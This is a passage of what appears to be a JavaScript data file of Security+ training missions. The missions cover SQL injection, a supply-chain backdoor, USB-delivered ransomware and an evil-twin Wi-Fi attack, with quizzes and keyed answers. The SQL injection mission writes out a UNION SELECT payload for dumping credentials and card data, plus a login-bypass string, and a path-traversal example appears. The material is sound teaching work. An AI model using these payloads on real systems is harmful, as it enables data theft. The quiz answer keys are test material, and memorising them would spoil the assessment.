    briefing: `CRITICAL BREACH: Your e-commerce platform is down. Customers are reporting fraudulent charges. Your database administrator just called in a panic — someone dumped the entire customer database including 47,000 credit card records. The attacker also gained administrative access to the web application and modified product prices. Your incident response team has 20 minutes before you\'re required to notify the payment card industry. Find the entry point and the privilege escalation path.`,

    intel: [
      {
        id: 'app-01',
        type: 'log',
        label: 'Web Application Firewall Logs',
        content: `ATTACK SIGNATURE DETECTED — SQL Injection Attempt:

Timestamp: 09:47:22
Source IP: 45.142.212.87
Target: /search.php?query=
Payload: ' OR '1'='1' UNION SELECT username,password,email,ccnum FROM users--

HTTP 200 OK — Request succeeded (vulnerability confirmed)

SQL INJECTION explained:
  - Normal search query: SELECT * FROM products WHERE name LIKE '%search_term%'
  - Attacker injects SQL code into the input field
  - Malicious query: SELECT * FROM products WHERE name LIKE '%' OR '1'='1' UNION SELECT username,password,email,ccnum FROM users--%'

How it works:
  - ' OR '1'='1' makes the WHERE clause always true (returns everything)
  - UNION SELECT adds a second query to extract data from the users table
  - -- is a SQL comment that ignores everything after (bypasses rest of original query)

The application didn't validate/sanitize the input. User-controlled input was directly concatenated into the SQL query string. This is the #1 web application vulnerability.

The attacker successfully retrieved usernames, passwords (hashed), emails, and credit card numbers in a single query.`,
        critical: true
      },
      {
        id: 'app-02',
        type: 'forensic',
        label: 'Database Query Logs',
        content: `ATTACK PROGRESSION — Timeline:

09:47:22 — Initial SQL injection in search parameter (data exfiltration)
  Query returned: 47,000 user records including credentials

09:52:18 — Second injection in login form
  Payload: admin' OR '1'='1'--
  Result: Authentication BYPASSED — logged in as 'admin' without password

10:03:44 — Privilege escalation attempt
  Discovered admin account had default/weak password: 'admin123'
  Attacker used SQL injection to extract password hash
  Cracked hash offline using rainbow table (pre-computed hash database)
  Logged in legitimately using admin:admin123

10:11:09 — Administrative access achieved
  Modified product prices (set iPhone to $1.00)
  Created new admin account 'maintenance' as backdoor
  Disabled fraud detection rules
  Exfiltrated complete order history

PRIVILEGE ESCALATION defined:
  - Attacker started with NO access (anonymous user)
  - Escalated to USER access (via SQL injection authentication bypass)
  - Escalated to ADMIN access (via weak credentials discovered through injection)
  - Each step increased their privileges and capabilities

Defense failures:
  - No input validation (enabled SQL injection)
  - Weak/default admin password
  - No password complexity requirements
  - Admin panel accessible from internet with no IP restrictions`,
        critical: true
      },
      {
        id: 'app-03',
        type: 'report',
        label: 'Application Vulnerability Types',
        content: `WEB APPLICATION VULNERABILITIES (CompTIA 2.3):

SQL INJECTION (SQLi):
  - Attacker injects malicious SQL code into input fields
  - Exploits lack of input validation/sanitization
  - Impact: Data theft, authentication bypass, database modification
  - Prevention: Parameterized queries (prepared statements), input validation, least privilege DB accounts

CROSS-SITE SCRIPTING (XSS):
  - Attacker injects malicious JavaScript into web pages viewed by other users
  - Exploits lack of output encoding
  - Impact: Session hijacking, credential theft, malware delivery
  - Prevention: Input sanitization, output encoding, Content Security Policy (CSP)

BUFFER OVERFLOW:
  - Attacker sends more data than a buffer can hold, overwriting adjacent memory
  - Can lead to code execution
  - Prevention: Input length validation, modern languages with memory safety

CROSS-SITE REQUEST FORGERY (CSRF):
  - Tricks authenticated users into performing unwanted actions
  - Exploits trust that a site has in the user's browser
  - Prevention: Anti-CSRF tokens, SameSite cookies

DIRECTORY TRAVERSAL:
  - Attacker manipulates file path parameters to access files outside intended directory
  - Example: ../../../etc/passwd
  - Prevention: Input validation, sandboxing, avoid direct file path parameters

PRIVILEGE ESCALATION:
  - Vertical: Low privilege to higher privilege (user to admin) — occurred in this attack
  - Horizontal: Access to resources of another user at same privilege level
  - Prevention: Least privilege, proper authorization checks, secure credential storage

MEMORY INJECTION (DLL Injection):
  - Injecting code into running process memory
  - Prevention: Code signing, application whitelisting

RACE CONDITIONS (Time-of-Check to Time-of-Use / TOCTOU):
  - Exploiting the time gap between checking a condition and using the result
  - Prevention: Atomic operations, proper locking`,
        critical: false
      },
      {
        id: 'app-04',
        type: 'alert',
        label: 'Credit Card Fraud Detection',
        content: `PAYMENT FRAUD ALERTS:

Since 10:15 AM:
  - 127 orders placed for iPhones at $1.00 (modified price)
  - 89 orders for high-value electronics at fraudulent prices
  - Orders shipping to 34 different addresses (mule network)
  - Estimated fraud exposure: $847,000

Payment processor (Stripe) flagged the unusual activity and suspended the merchant account at 10:42 AM. Website is now offline.

The attacker didn't just steal data — they monetized access in real-time by manipulating prices and placing fraudulent orders. This demonstrates the difference between a data breach (confidentiality loss) and an integrity attack (unauthorized modification).

Additional findings:
  - Customer passwords were hashed with MD5 (cryptographically broken)
  - No salts used (rainbow table attack was trivial)
  - Credit card data stored in plaintext (PCI-DSS violation)
  - No encryption at rest

PCI-DSS (Payment Card Industry Data Security Standard) requires:
  - Encryption of cardholder data at rest and in transit
  - Strong password policies
  - Regular vulnerability scanning
  - Secure coding practices

Your company is in violation of PCI-DSS. The payment processor will fine you and may terminate the merchant agreement.`,
        critical: false
      },
      {
        id: 'app-05',
        type: 'witness',
        label: 'Developer Interview',
        content: `Interview with Lead Developer:

"The search function was built 3 years ago by a contractor who's no longer with the company. It uses string concatenation to build SQL queries — I know that's bad practice now, but back then we were moving fast and didn't have a security review process.

We've been meaning to refactor it to use prepared statements, but it kept getting deprioritized. The search function worked, and we had other features to ship.

The admin password... yeah, that's on me. It was set to 'admin123' during initial deployment and we never rotated it. I thought it was only accessible from the internal network, but apparently the firewall rule allowing port 443 from anywhere meant anyone could reach the admin panel.

We don't have a Web Application Firewall. We don't do code security scanning. We don't have penetration testing. Our security budget is basically zero. Management sees security as a cost center, not a necessity.

I've been warning about this for 18 months. I sent three emails to the CTO flagging the SQL injection risk. No response. Now we're here."`,
        critical: false
      }
    ],

    challenge: {
      question: 'The attacker achieved admin access through a combination of vulnerabilities. What was the PRIMARY application vulnerability that enabled the initial breach?',
      options: [
        'Weak default password on the admin account',
        'SQL injection due to lack of input validation',
        'Cross-site scripting in the search function',
        'Buffer overflow in the login form'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: The weak default password enabled privilege escalation to admin, but it wasn\'t the initial entry point. The attacker discovered the admin credentials through SQL injection. Weak passwords are a vulnerability, but they came into play after the injection.',
        'CORRECT: SQL injection was the primary vulnerability. The search function didn\'t validate user input, allowing the attacker to inject malicious SQL code. This enabled data exfiltration (47,000 records), authentication bypass, and discovery of admin credentials. Everything else cascaded from this initial vulnerability.',
        'INCORRECT: Cross-site scripting (XSS) involves injecting malicious JavaScript, not SQL. The logs show SQL injection payloads (UNION SELECT, OR statements, SQL comments), not JavaScript.',
        'INCORRECT: Buffer overflow attacks target memory corruption, typically in compiled languages like C/C++. The logs show SQL injection in a web application. No buffer overflow occurred.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 2.3: Application Vulnerabilities. SQL injection remains one of the most critical web vulnerabilities, enabling data theft, authentication bypass, and privilege escalation.

Key concepts learned:
  - SQL injection exploits lack of input validation, allowing attackers to inject malicious database queries
  - Privilege escalation: attacker progressed from no access → user access → admin access
  - Defense: Use parameterized queries (prepared statements), never concatenate user input into SQL
  - Application vulnerabilities: SQLi, XSS, CSRF, buffer overflow, directory traversal, privilege escalation
  - Weak/default passwords amplify other vulnerabilities
  - PCI-DSS requires encryption, secure coding, vulnerability management
  - Defense-in-depth: WAF, input validation, least privilege, strong passwords, network segmentation`,

    escalation: `The breach exposed 47,000 customer records including credit card numbers. Fraudulent charges totaling $89,000 appeared on customer cards within 24 hours. The payment processor terminated your merchant account and levied a $250,000 PCI-DSS violation fine. Your company faces mandatory breach notification to all affected customers, state attorneys general, and credit bureaus. Class action lawsuits have been filed. The estimated total cost: $4.7 million in fines, legal fees, fraud reimbursement, and lost business. The CTO and Lead Developer were terminated.`,

    refs: [
      { source: 'Study Guide', section: '2.3 - Application Vulnerabilities', page: 30 },
      { source: 'Study Guide', section: '2.3 - SQL Injection', page: 31 },
      { source: 'Study Guide', section: '2.3 - Privilege Escalation', page: 32 }
    ]
  },

  // ============================================================
  // DOMAIN 2 — Threats, Vulnerabilities, Mitigations (Obj 2.3)
  // Teaches: Supply Chain Attacks, Zero-Day, System Vulnerabilities
  // ============================================================
  {
    id: 'MISSION-014',
    title: 'The Trojan Update',
    domain: 'Threats, Vulnerabilities, Mitigations',
    objectiveCodes: ['2.3'],
    threatLevel: 'critical',
    tags: ['Supply Chain Attack', 'Malware', 'Third-Party Risk', 'Software Updates', 'Zero-Day'],
    briefing: `EMERGENCY ALERT: Your monitoring systems are lighting up with suspicious outbound traffic from 47 workstations and 12 servers. All affected systems have one thing in common — they recently installed an update from TechMonitor Pro, your trusted system monitoring software vendor. The vendor just issued an emergency bulletin: their software build pipeline was compromised, and yesterday's update (version 8.4.2) contains a backdoor. You deployed it company-wide 14 hours ago. This is a supply chain attack.`,

    intel: [
      {
        id: 'supply-01',
        type: 'alert',
        label: 'Vendor Security Bulletin',
        content: `EMERGENCY SECURITY ADVISORY — TechMonitor Pro

CRITICAL: Software Update 8.4.2 Compromised

Timeline:
  - October 15: Attacker gained access to our build server via stolen credentials
  - October 16-20: Attacker modified build scripts to inject malicious code
  - October 21: Compromised update 8.4.2 released via automatic update mechanism
  - October 22 (TODAY): Backdoor discovered by third-party security researcher

SUPPLY CHAIN ATTACK defined:
  - Attackers compromise a trusted vendor/supplier
  - Inject malware into software updates, hardware components, or services
  - Malware distributed to all customers who trust the vendor
  - Exploits the trust relationship between vendor and customer

Impact:
  - Estimated 14,000 customers deployed update 8.4.2
  - Backdoor provides remote code execution to attacker's C2 server
  - Currently observed: Data exfiltration, lateral movement, credential harvesting

Recommended Actions:
  - IMMEDIATELY uninstall TechMonitor Pro 8.4.2
  - Roll back to version 8.4.1 (verified clean)
  - Isolate affected systems until forensic analysis complete
  - Assume all systems that ran 8.4.2 are compromised

This is similar to the SolarWinds attack (2020), where attackers compromised the Orion software build process and distributed malware to 18,000+ customers including Fortune 500 companies and government agencies.`,
        critical: true
      },
      {
        id: 'supply-02',
        type: 'forensic',
        label: 'Malware Analysis Report',
        content: `REVERSE ENGINEERING — TechMonitor Pro 8.4.2

Malicious code injection discovered in: MonitorService.dll

Normal function:
  - Collects system metrics (CPU, memory, disk, network)
  - Sends metrics to management dashboard

Malicious modifications:
  - Added code to download secondary payload from attacker C2 server
  - Payload: Custom backdoor ("ShadowMonitor")
  - Capabilities:
    * Remote command execution
    * File system access (read, write, delete)
    * Credential harvesting from LSASS memory
    * Keylogging
    * Screenshot capture
    * Lateral movement via SMB and WMI

Persistence mechanism:
  - Created scheduled task: "SystemMonitorUpdate" (runs every 6 hours)
  - Registry key: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  - Service: "MonitorSvc" (starts automatically on boot)

Evasion techniques:
  - Code signing: Attacker used vendor's STOLEN code-signing certificate
    → Windows trusted the update as legitimate
  - Anti-analysis: Malware detects virtual machines and sandboxes, remains dormant if detected
  - Encrypted C2 communication (TLS 1.3) blends with normal HTTPS traffic

The stolen code-signing certificate is the critical element — it allowed malware to bypass Windows Defender, application whitelisting, and user warnings. This is why code-signing key protection is critical.`,
        critical: true
      },
      {
        id: 'supply-03',
        type: 'report',
        label: 'Vulnerability Types: Systems & Supply Chain',
        content: `SYSTEM & SUPPLY CHAIN VULNERABILITIES (CompTIA 2.3):

SUPPLY CHAIN ATTACKS:
  - Compromise trusted vendors/suppliers to distribute malware
  - Examples: SolarWinds (Orion), CCleaner, Kaseya
  - Prevention: Vendor security assessments, code signing verification, update integrity checks (hashing)

ZERO-DAY VULNERABILITIES:
  - Previously unknown vulnerabilities with no patch available
  - "Zero days" since disclosure = no time to fix
  - Highly valuable to attackers and nation-states
  - Detection: Behavioral analysis, threat intelligence, anomaly detection

OS VULNERABILITIES:
  - Windows, Linux, macOS vulnerabilities
  - Mitigation: Patching, hardening, least privilege

CLOUD-SPECIFIC VULNERABILITIES:
  - Misconfigurations (public S3 buckets, overly permissive IAM)
  - Shared responsibility gaps
  - API vulnerabilities
  - Mitigation: Configuration management, CSPM (Cloud Security Posture Management)

VIRTUALIZATION VULNERABILITIES:
  - VM ESCAPE: Attacker breaks out of virtual machine to access host OS
  - Hypervisor vulnerabilities
  - Mitigation: Hypervisor patching, VM isolation, micro-segmentation

MOBILE DEVICE VULNERABILITIES:
  - Jailbreaking/rooting
  - Malicious apps
  - Mitigation: MDM (Mobile Device Management), app vetting

MISCONFIGURATION VULNERABILITIES:
  - Default passwords
  - Unnecessary services enabled
  - Overly permissive access controls
  - Prevention: Configuration baselines, automated scanning, change management

MALICIOUS UPDATES:
  - Compromised software updates (this attack)
  - Fake updates distributed via phishing
  - Prevention: Verify digital signatures, controlled deployment, canary testing`,
        critical: false
      },
      {
        id: 'supply-04',
        type: 'log',
        label: 'Network Traffic Analysis',
        content: `OUTBOUND C2 COMMUNICATION DETECTED:

Destination: 185.234.72.19:443 (TLS encrypted)
Protocol: HTTPS (blends with legitimate traffic)
Volume: 2.3 GB exfiltrated over 14 hours
Affected systems: 47 workstations, 12 servers

Data exfiltrated (based on TLS fingerprinting and timing analysis):
  - Active Directory credentials
  - Employee personal identifiable information (PII) from HR database
  - Source code from development servers
  - Customer database (partial)
  - VPN configuration files
  - Network topology diagrams

The backdoor was selective:
  - Prioritized high-value targets (domain controllers, dev servers, databases)
  - Avoided excessive bandwidth consumption to stay under the radar
  - Operated during business hours to blend with normal traffic

Detection gaps:
  - No application whitelisting (malicious DLL ran without restriction)
  - No egress filtering (outbound C2 traffic not blocked)
  - No file integrity monitoring (DLL modification not detected)
  - No behavior-based EDR (Endpoint Detection and Response)

The automatic update mechanism became the attack vector. Your patching process, designed to improve security, instead distributed malware because vendor trust was absolute and update verification was absent.`,
        critical: false
      },
      {
        id: 'supply-05',
        type: 'witness',
        label: 'IT Operations Manager Interview',
        content: `Interview with IT Ops Manager:

"TechMonitor Pro is a vendor we've used for 5 years. They're on our approved vendor list. We trust them. When the update notification came through, we deployed it immediately using our automated patch management system. It was digitally signed by TechMonitor's certificate — all our checks passed.

We don't stage updates or test them in a sandbox environment first. We don't have the resources for that. We rely on the vendor to ship clean code. Apparently, that trust was misplaced.

We had no idea the vendor's build pipeline was compromised. They didn't notify us of any security incident. We found out when the backdoor was already running on our network for 14 hours.

Lesson learned: Even trusted vendors can be compromised. We need defense-in-depth — not just trust. We should have:
  - Staged deployment (deploy to 10% of systems, monitor, then roll out)
  - Integrity verification (hash checks against known-good versions)
  - Behavioral monitoring to detect anomalous activity even from 'trusted' software
  - Vendor security assessments (audit their security practices)
  - Incident response clauses in vendor contracts

We're now performing forensics on all 59 affected systems. Rebuilding from clean images. It's going to take weeks."`,
        critical: false
      }
    ],

    challenge: {
      question: 'Based on your investigation, what is the PRIMARY reason the malware was able to execute on all systems without being blocked?',
      options: [
        'The malware exploited a zero-day vulnerability in Windows',
        'The attacker used the vendor\'s stolen code-signing certificate to appear legitimate',
        'The attack was a VM escape that bypassed hypervisor protections',
        'The malware was delivered via a phishing email attachment'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: While zero-day vulnerabilities are dangerous, the investigation shows the malware was delivered through a trusted software update, not by exploiting an unknown vulnerability. The update mechanism itself was the attack vector.',
        'CORRECT: The attackers stole TechMonitor\'s code-signing certificate and used it to sign the malicious update. Windows, antivirus software, and application whitelisting all trusted the digitally signed code as legitimate. Code signing is designed to verify software authenticity — but if the certificate is stolen, it becomes a weapon.',
        'INCORRECT: VM escape is breaking out of a virtual machine to access the host. This attack involved malicious software updates distributed to physical and virtual systems alike. No VM escape occurred.',
        'INCORRECT: The malware was distributed through the vendor\'s automatic update mechanism, not phishing. The vendor\'s compromised build pipeline was the attack vector.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 2.3: Supply Chain and System Vulnerabilities. Supply chain attacks compromise trusted vendors to distribute malware at scale — one of the most impactful modern attack vectors.

Key concepts learned:
  - Supply chain attacks exploit trust relationships between vendors and customers
  - Code-signing certificates verify software authenticity — stolen certificates bypass security controls
  - Defense-in-depth: Don't rely solely on vendor trust — verify, stage, and monitor updates
  - System vulnerabilities: OS flaws, cloud misconfigurations, virtualization (VM escape), mobile, zero-days
  - Malicious updates can be signed with legitimate certificates if attackers compromise the vendor
  - Mitigations: Vendor security assessments, staged deployment, integrity verification (hashing), behavioral monitoring (EDR), incident response contract clauses
  - Examples: SolarWinds, CCleaner, Kaseya attacks`,

    escalation: `The backdoor ran for 14 hours before discovery, exfiltrating 2.3 GB of sensitive data including Active Directory credentials, source code, and customer PII. Attackers used stolen domain admin credentials to deploy ransomware to 30% of the infrastructure. Recovery took 3 weeks and cost $1.8 million. The vendor (TechMonitor Pro) faces a class action lawsuit from 14,000 affected customers. Your company is reviewing all vendor relationships and implementing mandatory security assessments, staged deployments, and EDR behavioral monitoring.`,

    refs: [
      { source: 'Study Guide', section: '2.3 - Supply Chain Attacks', page: 33 },
      { source: 'Study Guide', section: '2.3 - Zero-Day Vulnerabilities', page: 34 },
      { source: 'Study Guide', section: '2.3 - System Vulnerabilities', page: 35 }
    ]
  },

  // ============================================================
  // DOMAIN 2 — Threats, Vulnerabilities, Mitigations (Obj 2.4)
  // Teaches: Malware Types (Ransomware, Trojans, Rootkits, Physical attacks)
  // ============================================================
  {
    id: 'MISSION-015',
    title: 'The Parking Lot Drop',
    domain: 'Threats, Vulnerabilities, Mitigations',
    objectiveCodes: ['2.4'],
    threatLevel: 'critical',
    tags: ['Malware', 'Ransomware', 'USB Attack', 'Physical Security', 'Rootkit'],
    briefing: `CRITICAL INCIDENT: At 6:47 AM, your entire network went dark. Every workstation, server, and database is displaying the same message: "YOUR FILES HAVE BEEN ENCRYPTED. PAY 10 BITCOIN TO DECRYPT." This is ransomware. Your backup systems are also encrypted. Security footage shows an employee plugging a USB drive into their workstation yesterday at 4:15 PM — a drive they found in the parking lot with a label "EMPLOYEE SALARY DATA - CONFIDENTIAL". That USB was the initial infection vector. You have 72 hours before the ransom doubles.`,

    intel: [
      {
        id: 'malware-01',
        type: 'forensic',
        label: 'USB Drive Malware Analysis',
        content: `FORENSIC EXAMINATION — USB Device (Recovered):

Device label: "EMPLOYEE SALARY DATA - CONFIDENTIAL"
File visible: SalaryReview_2024.xlsx.exe (note the .exe extension hidden by default in Windows)

This is a TROJAN:
  - Malware disguised as legitimate software
  - Named to look like a harmless spreadsheet
  - Relies on social engineering (curiosity about salaries) + USB baiting attack
  - When executed, displays a fake error message ("File corrupted") while malware runs in background

Malware chain of execution:

STAGE 1 — Initial Payload (Trojan)
  - User double-clicks "SalaryReview_2024.xlsx.exe"
  - Trojan executes, displays decoy error message
  - Downloads Stage 2 from attacker C2 server

STAGE 2 — Persistence & Privilege Escalation
  - Installs ROOTKIT: "SVCHost.sys" (kernel-mode driver)
  - Rootkit definition: Malware that operates at OS kernel level, hiding its presence
  - Rootkit hides malicious processes, files, and registry keys from Task Manager and antivirus
  - Exploits CVE-2023-21768 (Windows privilege escalation) to gain SYSTEM-level access

STAGE 3 — Lateral Movement
  - Uses stolen credentials (KEYLOGGER deployed in Stage 2)
  - Spreads via SMB to all network shares
  - Deploys ransomware payload to 247 systems

STAGE 4 — Ransomware Deployment
  - Malware name: "LockBit 3.0" (ransomware-as-a-service variant)
  - Encrypts files with AES-256
  - Targets: Databases, documents, images, backups
  - Leaves ransom note in every directory

Physical attack vector (USB DROP):
  - Attacker scattered 15 USB drives in parking lot
  - Labeled to create urgency/curiosity (salary data, HR reports, bonus info)
  - Also known as "USB baiting" or "Rubber Ducky" style attack (though Rubber Ducky is a specific HID-emulation device)`,
        critical: true
      },
      {
        id: 'malware-02',
        type: 'alert',
        label: 'Ransomware Behavior Analysis',
        content: `RANSOMWARE EXECUTION TIMELINE:

4:15 PM (Day 1) — USB drive inserted, trojan executed
4:16 PM — Rootkit installed, antivirus disabled
4:20 PM — Keylogger captured domain admin credentials
5:45 PM — Lateral movement began (SMB spreading)
6:00 PM — Backup server compromised, backups encrypted
11:30 PM — Ransomware payload deployed to domain controller
6:47 AM (Day 2) — Mass encryption event across all systems

RANSOMWARE characteristics:
  - Encrypts victim files and demands payment for decryption key
  - Modern variants: Double extortion (encrypt + threaten to leak data)
  - Delivery: Phishing, exploit kits, USB drops, RDP brute force
  - Payment: Cryptocurrency (Bitcoin, Monero) for anonymity

Why backups failed:
  - Backups were on network-attached storage (NAS) accessible via SMB
  - Ransomware specifically targets backup systems
  - Backup drives were mounted and accessible from compromised domain controller
  - No air-gapped/offline backups existed

Indicators of malware activity (pre-encryption):
  - Unusual outbound network traffic (C2 communication)
  - New scheduled tasks created
  - Suspicious processes (hidden by rootkit)
  - Mass file access patterns
  - Antivirus/EDR disabled or tampered with
  - Missing or modified system logs (rootkit covering tracks)

Your SIEM should have alerted on these indicators but didn't because:
  - Rootkit hid malicious processes from monitoring tools
  - No behavior-based EDR was deployed
  - Log forwarding from endpoints was incomplete`,
        critical: true
      },
      {
        id: 'malware-03',
        type: 'report',
        label: 'Malware Types Reference',
        content: `MALWARE TYPES (CompTIA 2.4):

RANSOMWARE:
  - Encrypts files, demands payment
  - Modern variants: Double/triple extortion (encrypt + leak threat + DDoS)

VIRUSES:
  - Self-replicating malware that attaches to files
  - Requires user action to execute (open file)

WORMS:
  - Self-replicating malware that spreads automatically over networks
  - No user action needed (exploits vulnerabilities)

TROJANS:
  - Malware disguised as legitimate software
  - Does not self-replicate
  - Examples: Fake software, backdoors, this USB attack

ROOTKITS:
  - Malware that operates at kernel/firmware level
  - Hides its presence from OS and security tools
  - Very difficult to detect and remove

KEYLOGGERS:
  - Records keystrokes to steal credentials, sensitive data
  - Can be software or hardware-based

SPYWARE:
  - Monitors user activity without consent
  - Collects browsing history, credentials, personal info

BLOATWARE:
  - Unwanted software pre-installed on devices (typically not malicious but degrades performance)

LOGIC BOMBS:
  - Malware that triggers under specific conditions (date, event, command)
  - Example: Employee plants code that deletes files if they're fired

FILELESS MALWARE:
  - Operates in memory, doesn't write to disk
  - Evades traditional antivirus (which scans files)
  - Uses legitimate tools (PowerShell, WMI)

PHYSICAL ATTACKS (USB-based):
  - USB drop attacks (this scenario)
  - USB Rubber Ducky: Device that emulates keyboard (HID attack), types malicious commands at superhuman speed when plugged in
  - Prevention: Disable AutoRun, endpoint protection, user training, physical port controls`,
        critical: false
      },
      {
        id: 'malware-04',
        type: 'witness',
        label: 'Employee Interview',
        content: `Interview with employee who inserted USB:

"I found the USB drive in the parking lot when I arrived at work yesterday around 4 PM. It had a label that said 'EMPLOYEE SALARY DATA - CONFIDENTIAL'. I thought maybe someone from HR dropped it, and it had sensitive information that shouldn't be lying around.

I brought it inside and plugged it into my workstation to see who it belonged to so I could return it. There was a file called 'SalaryReview_2024.xlsx' — I double-clicked to open it, but I got an error saying the file was corrupted.

I didn't think anything of it. I just unplugged the USB and threw it in my drawer. I had no idea it was a trap.

Looking back, I realize:
  - I should have reported the USB to IT/Security instead of plugging it in
  - The curiosity about salary data was exactly what the attacker was counting on
  - I didn't notice the file was actually '.xlsx.exe' because Windows hides file extensions by default
  - By the time I got the 'corrupted file' error, the malware was already running

I'm really sorry. I was trying to help and I ended up causing this disaster."`,
        critical: false
      },
      {
        id: 'malware-05',
        type: 'log',
        label: 'Incident Response Options Analysis',
        content: `RANSOMWARE RESPONSE OPTIONS:

Option 1: Pay the ransom (10 Bitcoin = ~$430,000)
  - Pros: Potentially fastest recovery path
  - Cons: 
    * No guarantee attackers provide working decryption key
    * Funds criminal organizations
    * Encourages future attacks
    * May violate sanctions (paying designated terrorist organizations)
    * FBI/CISA recommend NOT paying

Option 2: Restore from backups
  - Status: PRIMARY BACKUPS ENCRYPTED
  - Alternative: Check for offline/cloud backups not connected to network
  - Found: 7-day-old backup on offline tape drive in storage
  - Data loss: 7 days of transactions, emails, work product
  - Estimated recovery time: 5-7 days

Option 3: Attempt decryption without paying
  - Some ransomware variants have known weaknesses
  - Check No More Ransom project (law enforcement decryption tools)
  - LockBit 3.0: NO known decryption available without key

Option 4: Rebuild from scratch
  - Nuclear option: Wipe all systems, rebuild from clean images
  - Restore data from 7-day-old offline backup
  - Estimated downtime: 10-14 days
  - Guaranteed malware removal

Your CISO's decision: Option 2 + Option 4 hybrid
  - Restore from 7-day-old offline backup
  - Rebuild domain controller and critical systems from clean images
  - Do NOT pay ransom
  - Report incident to FBI (required for critical infrastructure)

Lessons learned:
  - Air-gapped backups are essential
  - Immutable backups (write-once, can't be encrypted/deleted)
  - USB port controls and endpoint protection
  - User security awareness training (don't plug unknown USB devices)`,
        critical: false
      }
    ],

    challenge: {
      question: 'The malware used a rootkit to hide its presence. What is the defining characteristic of a rootkit that made it so difficult to detect?',
      options: [
        'It self-replicates across the network without user interaction',
        'It operates at kernel level and hides processes from the operating system',
        'It encrypts files and demands payment for decryption',
        'It records keystrokes to steal passwords and credentials'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Self-replication without user interaction describes a WORM. Rootkits don\'t necessarily self-replicate — their defining feature is stealth and persistence by operating at a low system level.',
        'CORRECT: Rootkits operate at the kernel or firmware level, allowing them to hide malicious processes, files, and registry keys from the operating system itself. Security tools that rely on OS APIs can\'t see what the rootkit hides. This deep system access makes rootkits extremely difficult to detect and remove.',
        'INCORRECT: Encrypting files and demanding payment describes RANSOMWARE. The rootkit in this attack was used to hide the ransomware deployment, but encryption is not a rootkit characteristic.',
        'INCORRECT: Recording keystrokes describes a KEYLOGGER. While this attack included a keylogger component, that\'s separate from the rootkit. The rootkit\'s role was to hide the malware\'s presence.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 2.4: Malware. The attack combined multiple malware types: a trojan (disguised file), rootkit (stealth/persistence), keylogger (credential theft), and ransomware (encryption/extortion).

Key concepts learned:
  - Malware types: Ransomware, viruses, worms, trojans, rootkits, keyloggers, spyware, logic bombs, fileless malware
  - Physical attacks: USB drop/baiting attacks exploit human curiosity and trust
  - Rootkits operate at kernel level, hiding from OS and security tools
  - Ransomware targets backups — air-gapped/immutable backups are critical
  - Indicators of malware: Unusual network traffic, new scheduled tasks, disabled security tools, mass file access
  - USB Rubber Ducky: HID emulation device that types malicious commands
  - Response: Don't pay ransoms, restore from offline backups, rebuild from clean images
  - Prevention: Disable AutoRun, endpoint protection (EDR), user training, physical port controls`,

    escalation: `The ransomware encrypted 247 systems including all production databases and backup servers. Recovery from the 7-day-old offline backup took 6 days of round-the-clock work. Data loss: 7 days of customer transactions, emails, and engineering work. Financial impact: $890,000 in downtime, incident response, forensics, and lost revenue. Three major customers terminated contracts due to the outage. The FBI investigation is ongoing. The company implemented mandatory USB port blocking, deployed EDR to all endpoints, and moved to immutable cloud backups. Security awareness training now includes monthly phishing and physical security exercises.`,

    refs: [
      { source: 'Study Guide', section: '2.4 - Malware', page: 36 },
      { source: 'Study Guide', section: '2.4 - Ransomware', page: 37 },
      { source: 'Study Guide', section: '2.4 - Physical Attacks', page: 38 }
    ]
  },

  // ============================================================
  // DOMAIN 2 — Threats, Vulnerabilities, Mitigations (Obj 2.4)
  // Teaches: Network Attacks, Wireless Attacks, Cryptographic Attacks
  // ============================================================
  {
    id: 'MISSION-016',
    title: 'The Evil Twin',
    domain: 'Threats, Vulnerabilities, Mitigations',
    objectiveCodes: ['2.4'],
    threatLevel: 'high',
    tags: ['Network Attacks', 'Wireless', 'Evil Twin', 'MitM', 'Credential Theft'],
    briefing: `SECURITY ALERT: Multiple employees are reporting SSL certificate warnings when accessing internal company resources from the office WiFi. The help desk dismissed the first few reports as user error, but now 23 people have called in the past hour. Your network team discovered a rogue wireless access point broadcasting an SSID identical to the corporate WiFi: "CorpNet-Secure". Employees have been connecting to the attacker\'s network instead of the real one. This is an on-path attack in progress.`,

    intel: [
      {
        id: 'wireless-01',
        type: 'alert',
        label: 'Rogue Access Point Detection',
        content: `WIRELESS INTRUSION DETECTION ALERT:

UNAUTHORIZED ACCESS POINT DETECTED:
  SSID: "CorpNet-Secure" (matches legitimate corporate WiFi)
  BSSID: 00:11:22:33:44:55
  Channel: 6
  Signal strength: -42 dBm (VERY STRONG — physically close)
  Encryption: WPA2-PSK (same as legitimate AP)
  Location: Estimated within building (triangulation shows southeast corner, floor 3)

This is an EVIL TWIN attack:
  - Attacker deploys a rogue access point with the same SSID as the legitimate network
  - Often uses stronger signal to attract victims
  - Users connect automatically (their devices "remember" the SSID from previous legitimate connections)
  - All traffic flows through attacker's AP, enabling Man-in-the-Middle (MitM) / On-Path attack

How users were fooled:
  - SSID "CorpNet-Secure" is identical to the legitimate network
  - Windows/macOS/mobile devices auto-connect to known SSIDs
  - Most users don't verify the BSSID (hardware MAC address of the AP)
  - No certificate pinning on corporate apps (would prevent MitM)

Difference from ROGUE AP:
  - Rogue AP: Unauthorized access point (could be accidental — employee's personal WiFi)
  - Evil Twin: Specifically mimics legitimate network to intercept traffic (always malicious)`,
        critical: true
      },
      {
        id: 'wireless-02',
        type: 'forensic',
        label: 'Traffic Interception Analysis',
        content: `ON-PATH ATTACK (Man-in-the-Middle) FORENSICS:

Attack flow:
  1. Victim connects to Evil Twin AP (thinking it's legitimate CorpNet-Secure)
  2. Victim's traffic routes through attacker's device
  3. Attacker forwards traffic to the internet (victim gets connectivity, doesn't suspect anything)
  4. Attacker intercepts and reads/modifies all traffic in transit

What the attacker captured:
  - Usernames and passwords for internal portals (sent over HTTP, not HTTPS)
  - Email credentials (IMAP, SMTP)
  - Cookies and session tokens
  - Files uploaded/downloaded
  - Instant messages
  - VPN credentials (entered before VPN tunnel was established)

HTTPS/TLS interception:
  - Attacker performed SSL STRIPPING: Downgraded HTTPS to HTTP where possible
  - For sites that enforce HTTPS: Attacker presented self-signed certificates
  - Users saw "Certificate Warning: This connection is not secure"
  - 17 users clicked "Continue anyway" / "Accept Risk"
  - Those who accepted the fake cert had HTTPS traffic decrypted

